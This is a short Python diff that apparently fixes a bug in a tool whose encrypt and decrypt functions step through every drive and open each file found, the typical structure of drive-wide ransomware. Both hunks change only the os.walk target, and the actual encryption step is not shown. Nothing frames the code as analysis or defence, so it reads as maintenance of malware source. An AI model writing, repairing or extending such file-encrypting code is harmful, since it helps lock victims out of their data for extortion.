@@ -40,7 +40,7 @@ def encrypt(i, salt, method, mode):
             os.chdir(drives[drives.index(drive) + i])
         except IndexError:
             return True
-        for root, sub, file in os.walk(drives[drives.index(drive)]):
+        for root, sub, file in os.walk(drive):
             try:
                 for files in file:
                     with open(os.path.join(root, files), "rb")as f:
@@ -61,7 +61,7 @@ def decrypt(dkey, i):
             os.chdir(drives[drives.index(drive) + i])
         except IndexError:
             quit()
-        for root, sub, file in os.walk(drives[drives.index(drive)]):
+        for root, sub, file in os.walk(drive):
             try:
                 for files in file:
                     with open(os.path.join(root, files), "rb")as f:
